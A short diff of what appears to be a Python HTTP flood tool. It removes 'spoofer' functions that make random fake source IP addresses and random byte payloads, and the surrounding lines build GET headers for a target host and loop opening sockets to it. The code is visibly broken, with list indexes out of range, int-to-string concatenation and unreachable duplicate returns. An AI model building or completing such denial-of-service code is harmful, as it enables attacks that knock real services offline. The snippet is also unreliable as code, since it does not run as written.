@@ -383,31 +383,7 @@ def spoofer():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     return acces
  
-def spoofer2():
-    addr = [192, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(0, 255))
-    addr[4] = str(random.randrange(2, 254))
-    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4]
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    return acces
 
-def spoofer3():
-    global byte5
-    byte5 = random._urandom(5491)
-    addr = [192, 168, 0, 1]
-    d = '.'
-    addr[0] = str(random.randrange(11, 197))
-    addr[2] = str(random.randrange(0, 255))
-    addr[3] = str(random.randrange(0, 255))
-    addr[4] = str(random.randrange(2, 254))
-    addr[5] = str(random.randrange(2, 254))
-    acces =  addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d +addr[5]
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    return acces
-    return byte5
 def start2():
   global useragents, acceptall, ref, socks5
   global byte3, byte4, byte_host
@@ -449,9 +425,6 @@ def start():
   length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
   target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
   main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host  + "\r\n"
-  return hh
-  return byte2
-  return sock3
   while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
